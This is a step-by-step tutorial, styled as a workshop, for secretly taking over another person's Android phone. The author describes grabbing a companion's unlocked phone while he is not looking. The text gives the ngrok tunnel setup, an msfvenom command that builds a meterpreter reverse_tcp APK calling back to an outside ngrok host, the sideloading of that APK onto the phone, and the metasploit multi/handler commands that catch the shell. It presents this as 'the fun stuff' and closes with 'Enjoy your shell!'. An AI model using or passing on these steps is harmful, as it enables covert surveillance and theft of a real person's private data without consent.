## Workshop

### Attack Scenario. Went out with the victim and noticed he does not have his phone locked. I can grab his phone when he will not be looking to install and execute a reverse shell to gain access to his phone.

#### Workshop Steps.

First of all we need to consider how we will communicate with the mobile phone. We will not be in the same subnet with the victim so we need some kind of tunneling in order to be able to make the connection. In order to achieve this goal we will be using a utility called ngrok. ngrok is a utility that allows us to create a tunnel over the internet and map it to our localhost. It's basically an easy way to port forward a listener on our attacker's machine. Let's see how we will be setting it up.

##### ngrok configuration 

First we need to create an account to ngrok. That's easy and **FREE** . 
When we have our account setup we will be needing that access token it provides us with, so make sure you copy it and save it somewhere.

Next Download the application that comes along with it (from https://ngrok.com/download), unzip it and run the following command.
`./ngrok authtoken <your-token>` 
Note: Make sure you replace '<your-token>' with the token you copied earlier.

ngrok has been configured at this point.

##### ngrok setup tunnel

We will be using a reverse_tcp payload so we need a tcp tunnel on the internet to connect back to us without any conflicts.
ngrok makes this easy for us. We only have to type one command.
Execute the following command and let it active on a terminal. We won't be messing with this terminal any more, so open a new one to follow along.

`ngrok tcp 8080`
Note: 8080 is a port I chose independently. You can choose whatever port you may want, just note it down because you will need to configure your payload differently later on.

##### Payload generation (The fun stuff)

We will be using a meterpreter shell from the metasploit. Don't be intimidated, this is not too hard.
Before we dive into the command we need to understand a few things. 
From the ngrok output we are interested in this line: `Forwarding                    tcp://0.tcp.ngrok.io:19526 -> localhost:8080`

This line tells us that the application is forwarding traffic from the 0.tcp.ngrok.io domain on port 19526 to our localhost on port 8080.
This means that the reverse shell needs to connect to 0.tcp.ngrok.io on port 19526 and we will be listening on localhost on port 8080. The magic behind this is that without ngrok we wouldn't be able to immediately connect to our localhost on our attacker machine from the victim. However, ngrok's domain is publicly available on the open internet and it's serving right into our machine.

Without any further delay let's jump into the fun part.

Execute the following command.
`msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=19526 R > android.apk`
This may take a while to return.

Note: Make sure to replace 0.tcp.ngrok.io and 19526 with your ngrok generated domain and port, otherwise the exploit won't work for you.

The msfvenom is a metasploit utility (Helper program if you may) that allows us to generate payloads of any type with ease. 
The -p flag sets the type of payload -> android/meterpreter/reverse_tcp means that we want an android compatible meterpreter shell over the tcp protocol. Note that this is a staged payload and we can notice this from the 'meterpreter/reverse_tcp'. If it was non-staged it would be 'meterpreter_reverse_tcp'
The LHOST parameter sets the ListenerHost and the LPORT parameter sets the ListeningPort. Note that this is different from the LHOST and LPORT on metasploit that we will be seeing later on. This Listener refers to the client payload listener, where the listening server lives on the internet. In this example the listening server lives at 0.tcp.ngrok.io at port 19526 for me.
The R > android.apk just redirects the payload output to a file.

Now we have that generated payload and we can tranfer it and install it to the victim's phone.
You can do that however you like. I will be doing it over USB transfer. You could also spin up an http server and download it from there.

After that we install it (If you need to enable 'Install from untrusted sources' go ahead and follow the instructions the phone provides. It should be straightforward)

##### Spin up the metasploit listener.

Now that we have the payload installed on the mobile we can spin up our metasploit listener to catch the connection.
In order to do that we need a few commands.

In the terminal type `msfconsole`
This may take a while to load so give it some time.

When it is loaded you will be greated with the metasploit banner and prompt.
We now need to type the following commands to spin the listener.

First we need to go to the right metasploit module to execute. This module is called handler.
`use exploit/multi/handler`
Then we need to set our payload
`set payload android/meterpreter/reverse_tcp`
Note that this payload has to be the exact same with the one we used with the msfvenom utility.

Next we need to configure our LHOST and LPORT

Our LHOST will be localhost this time because the traffic from ngrok's domain will be forwarded to our localhost.
`set LHOST 0.0.0.0`
And then our LPORT. This LPORT will be the one we started the ngrok with ('./ngrok tcp 8080') 
`set LPORT 8080`

and finally type `exploit`

##### Exploitation!

Now that our portforward is setup, the metasploit server is listening on the right port and the payload is installed on the phone we are ready for the exploitation phase.

All we need to do now is execute the payload on the phone by clicking the MainActivity application and we will get a connection over the internet on our metasploit listener. Enjoy your shell!

You can view the available commands by typing help on the meterpreter shell.

Note: Some commands may not work on specific mobile versions.